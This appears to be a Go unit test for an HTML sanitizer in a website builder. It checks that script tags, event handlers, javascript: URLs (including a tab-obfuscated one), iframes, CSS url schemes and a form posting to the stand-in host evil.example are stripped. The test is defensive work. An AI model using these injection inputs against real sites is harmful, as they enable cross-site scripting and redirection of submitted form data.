package models

import (
	"strings"
	"testing"
)

func TestSanitizeWebsiteHTML(t *testing.T) {
	cases := []struct {
		name, in string
		has      []string
		lacks    []string
	}{
		{"script dropped with content", `<p>a</p><script>alert(1)</script>`, []string{"<p>a</p>"}, []string{"script", "alert"}},
		{"handler stripped", `<div onclick="x()" class="bh-card">t</div>`, []string{`class="bh-card"`}, []string{"onclick"}},
		{"js url stripped", `<a href="javascript:alert(1)">x</a>`, []string{"<a>x</a>"}, []string{"javascript"}},
		{"obfuscated js url", "<a href=\"java\tscript:alert(1)\">x</a>", nil, []string{"script:"}},
		{"safe link kept", `<a href="/about" target="_blank">x</a>`, []string{`href="/about"`, `rel="noopener noreferrer"`}, nil},
		{"editor state stripped", `<div class="bhe-selected bh-hero" data-bhe-id="3" data-snippet="hero">x</div>`, []string{`class="bh-hero"`, `data-snippet="hero"`}, []string{"bhe-"}},
		{"iframe dropped", `<iframe src="x"></iframe>ok`, []string{"ok"}, []string{"iframe"}},
		{"form keeps data hook only", `<form action="https://evil.example" method="post" onsubmit="x()" data-bh-form="contact"><input type="email" name="email" required="" formaction="https://evil.example"/><textarea name="m"></textarea><button type="submit">Go</button></form>`, []string{`data-bh-form="contact"`, `type="email"`, `name="email"`, "<textarea", `type="submit"`}, []string{"action", "method", "onsubmit", "evil.example"}},
		{"password and file inputs lose their type", `<input type="password" name="p"/><input type="file" name="f"/><input type="hidden" name="h"/>`, []string{`name="p"`}, []string{"password", `type="file"`, `type="hidden"`}},
		{"style url scheme", `<div style="background:url(javascript:x)">a</div>`, []string{"<div>a</div>"}, []string{"javascript"}},
		{"style relative url kept", `<div style="background:url(/web/content/1)">a</div>`, []string{"url(/web/content/1)"}, nil},
		{"unknown wrapper unwrapped", `<custom-x><b>k</b></custom-x>`, []string{"<b>k</b>"}, []string{"custom-x"}},
		{"img void", `<img src="/a.png" alt="a">`, []string{`<img src="/a.png" alt="a"/>`}, nil},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := sanitizeWebsiteHTML(tc.in)
			if err != nil {
				t.Fatal(err)
			}
			for _, h := range tc.has {
				if !strings.Contains(out, h) {
					t.Errorf("want %q in %q", h, out)
				}
			}
			for _, l := range tc.lacks {
				if strings.Contains(strings.ToLower(out), l) {
					t.Errorf("did not want %q in %q", l, out)
				}
			}
			// Output must be strict-XML convertible for the Owl scaffold.
			if _, err := normalizeWebsiteHTMLToXMLFragment(out); err != nil {
				t.Errorf("not xml-convertible: %v", err)
			}
		})
	}
}
